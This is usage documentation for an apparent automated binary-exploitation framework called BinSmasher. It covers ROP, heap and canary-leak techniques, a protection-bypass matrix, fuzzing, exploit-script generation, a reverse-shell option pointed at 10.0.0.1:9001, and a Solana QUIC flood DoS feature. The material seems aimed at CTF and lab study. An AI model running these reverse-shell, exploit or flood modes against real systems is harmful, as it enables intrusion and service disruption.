## Framework Usage

### Subcommand `binary`

Exploits native ELF (Linux / Android) or PE (Windows via Wine) binaries.

#### Minimum usage

```bash
python3 src/main.py binary -b /path/to/binary --host 127.0.0.1 --port 4444
```

#### Automatic execution flow

```
setup_context()         → file(binary) → platform + arch → pwntools context
static_analysis()       → radare2 + nm + readelf → functions, vuln imports
check_protections()     → checksec / readelf → NX, canary, ASLR, PIE, RELRO, SafeSEH, CFG
load_library_offsets()  → ldd + /proc/maps → libc base + known offsets
detect_seccomp()        → seccomp-tools dump → orw_needed flag
find_offset()           → cyclic → GDB corefile → cyclic_find(pc)     [strategy 1]
                          fallback: GDB batch script                    [strategy 2]
                          fallback: remote ROTO crash heuristic        [strategy 3]
[canary leak]           → format-string %p chain
                          fallback: byte-by-byte fork brute force
[libc leak]             → ret2plt → GOT read → libc base
                          fallback: libc.rip API
[PIE leak]              → %p stack walk → page-aligned addr
                          fallback: 12-bit partial overwrite brute
try_ret2win()           → scan ELF symbols → win/flag/shell/easy/backdoor
                          offset brute 8..estimate to confirm output
build_rop_chain()       → ret2libc → ret2csu → SROP → execve chain → ret2dlresolve
build_orw_chain()       → open+read+write ROP for seccomp targets
build_stack_pivot()     → leave;ret gadget → BSS 2-stage pivot chain
create_heap_exploit()   → tcache/fastbin/UAF / safe-linking / Apple2 / Botcake / largebin
create_exploit()        → technique selection → 3 parallel workers → verify output
[privesc]               → sudo -l / SUID / getcap
```

#### Examples

```bash

    --reverse-shell --output-ip 10.0.0.1 --output-port 9001 -t
```

## Exploit Engine — Techniques

### Offset Detection

| Strategy | Method | Requires |
|----------|--------|---------|
| 1 — Corefile | `process()` + `p.wait(timeout=3)` + `cyclic_find(pc)` | Local binary |
| 2 — GDB batch | `gdb --batch` register read | GDB |
| 3 — ROTO | Remote crash scan, response truncation heuristic | Nothing |

### Leaks

| Leak | Method |
|------|--------|
| Canary | Format-string `%p` chain; byte-by-byte brute force (fork server) |
| Libc base | ret2plt → GOT read; `query_libc_rip()` API lookup |
| PIE base | `%p` stack walk for page-aligned address |
| PIE partial | 12-bit brute force (1/16 probability per attempt) |
| Heap address | `%p` scan for heap address range |

### ROP Chains

| Technique | When used |
|-----------|----------|
| `ret2win` | Binary has win / flag / shell / easy / backdoor symbol |
| `ret2libc` | NX on, libc base known, pop rdi; ret gadget |
| `ret2csu` | No pop rdi gadget |
| SROP (`--srop`) | Fallback from ret2csu; forced via flag |
| `execve` syscall | syscall + pop rax + pop rdi gadgets present |
| `ret2dlresolve` | No libc base, no win function |
| Stack shellcode | NX off |
| XOR-encoded shellcode | Bad bytes in shellcode |
| Stack pivot (`--stack-pivot`) | leave;ret → BSS 2-stage pivot |
| ORW chain (`--orw`) | seccomp blocks execve |
| Format string | Format string vuln + no Full RELRO |

### Heap Exploitation

| Technique | glibc |
|-----------|-------|
| tcache poison | < 2.32 |
| Safe-linking bypass | ≥ 2.32 |
| Fastbin dup | < 2.28 |
| Unsorted bin attack | < 2.28 |
| UAF | Any |
| House of Apple2 FSOP | ≥ 2.34 |
| House of Botcake | ≥ 2.34 |
| Largebin attack (`--largebin-attack`) | ≥ 2.27 |

### Windows / Platform

| Technique | Flag |
|-----------|------|
| SafeSEH bypass — POP POP RET scan | `--safeseh-bypass` |
| CFG bypass — GuardCFFunctionTable | `--cfi-bypass` |
| CFI bypass — valid-target pivot | `--cfi-bypass` |
| File payload — MP3 / raw embedding | `--file-input mp3\|raw` |

### Protection Bypass Matrix

| Protection | Status | Technique |
|-----------|--------|-----------|
| NX / DEP | ✅ Full | ret2win → ret2libc → ret2csu → SROP → ret2dlresolve |
| ASLR | ✅ Full | GOT leak, PIE stack leak, brute-force, one_gadget |
| Stack Canary | ✅ Full | format-string oracle + fork brute force |
| RELRO (Full/Partial) | ✅ Full | no GOT overwrite on Full RELRO |
| FORTIFY_SOURCE | ✅ Full | detected, shellcode adjusted |
| Heap < 2.32 | ✅ Full | tcache, fastbin, unsorted bin |
| Heap ≥ 2.32 | ✅ Full | safe-linking bypass |
| Heap ≥ 2.34 | ✅ Full | FSOP, Botcake, largebin |
| SafeSEH (Windows) | ✅ Full | POP POP RET chain |
| CFG (Windows) | ✅ Full | GuardCFFunctionTable pivot |
| CFI / fake vtable | ✅ Partial | valid-target pivot |
| seccomp-bpf | ✅ Partial | ORW chain + constrained ROP |
| SafeStack (LLVM) | ✅ Partial | leak + overwrite template |
| CET / Shadow Stack | ✅ Partial | SROP via signal frame |
| PIE | ✅ Full | stack leak + 12-bit partial brute |
| PAC (ARM64) | ⚠️ Partial | gadget scan + brute template |
| MTE (ARM64) | ⚠️ Detection | active bypass requires hardware |
| Intel CET (IBT+SS) | ⚠️ Detection | requires hardware CET |

## Fuzzer — Fuzzing and Offset Finding

| Feature | Description |
|---------|-------------|
| **ROTO heuristic** | `find_offset_roto()` — pure-network crash detection, no GDB needed. Sends increasing cyclic patterns, detects crash by empty or truncated response. |
| **SIGFAULT analysis** | `sigfault_analysis()` — spawns local binary, sends cyclic, captures SIGSEGV signal, extracts crash address via corefile → `cyclic_find()`. Falls back to ROTO. |
| **GDB script generation** | `generate_gdb_script(mode)` — writes pwndbg / peda / vanilla `.gdb` helper to `_bs_work/`. Includes `bs_find_offset`, `bs_stack`, `bs_regs`, `bs_exploit` macros. |
| AFL++ fuzzing | `afl_fuzz()` — coverage-guided fuzzing with crash triage. |
| boofuzz network | `fuzz_target()` — structured protocol fuzzing (raw / HTTP). |
| Mutation fuzzer | `mutation_fuzz()` — bit flips, byte mutations, boundary values. No external tools. |
| BPF fuzzing | `fuzz_bpf()` — Solana BPF program fuzzing with malformed ELF payloads. |
| QUIC DoS | `dos_quic()` — Solana QUIC flood packets. |

## Script Generation

`--generate-scripts` (or `--dos`) writes three files to `_bs_work/` next to the binary:

| File | Contents |
|------|----------|
| `crash_BINARY.py` | Sends cyclic crash payload — confirms the overflow path |
| `exploit_BINARY.py` | Full exploit: ret2win / ret2libc / SROP as detected |
| `BINARY_pwndbg.gdb` | GDB helper with `bs_find_offset`, `bs_exploit`, `bs_stack` macros |

```bash
# Generate all three files
python3 src/main.py binary -b ./vuln --host 127.0.0.1 --port 4444 \
    --generate-scripts --gdb-mode pwndbg

# Test the crash script
python3 _bs_work/crash_vuln.py

# Open GDB with the helper
gdb -x _bs_work/vuln_pwndbg.gdb
# At the gdb prompt:
# (gdb) bs_find_offset    — run with cyclic and print offset
# (gdb) bs_exploit        — print exploit payload bytes
# (gdb) bs_stack          — x/32gx $rsp
```

## Troubleshooting

### `ModuleNotFoundError: No module named 'pwn'`

```bash
pip install pwntools --break-system-packages
```

### `r2: command not found`

```bash
sudo apt install radare2
```

Without radare2, the analyzer falls back to `nm` + `readelf`. Fewer functions
are detected but the exploit pipeline still works.

### `checksec: command not found`

```bash
pip install checksec.py --break-system-packages
# Or: sudo apt install checksec
```

### `seccomp-tools: command not found`

```bash
gem install seccomp-tools
```

### `[Errno 111] Connection refused`

The target binary must be running and listening before BinSmasher starts:

```bash
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:'./vuln'
```

### `cyclic_find` returns `-1`

Pattern too small — increase `--pattern-size`:

```bash
python3 src/main.py binary -b ./vuln --host 127.0.0.1 --port 4444 \
    --pattern-size 1000 -t
```

### Binary path has spaces

BinSmasher's test suite creates wrapper scripts under `/tmp/_bs_<port>.sh`
automatically. Paths such as `Downloads/binsmasher (1)/v7/` are handled correctly.

### Test binaries not found

```bash
cd tests/src && make
```

### `ldd` fails on 32-bit binary

```bash
sudo apt install libc6-i386 gcc-multilib
```

### AFL++ produces no crashes

Ensure `afl_in/` has at least one seed and binary accepts stdin input.

```bash
python3 src/main.py binary -b ./vuln --afl-fuzz --afl-timeout 300
```

### Frida: `Failed to attach`

```bash
echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope
```

### Windows PE requires Wine

```bash
sudo apt install wine wine64
```
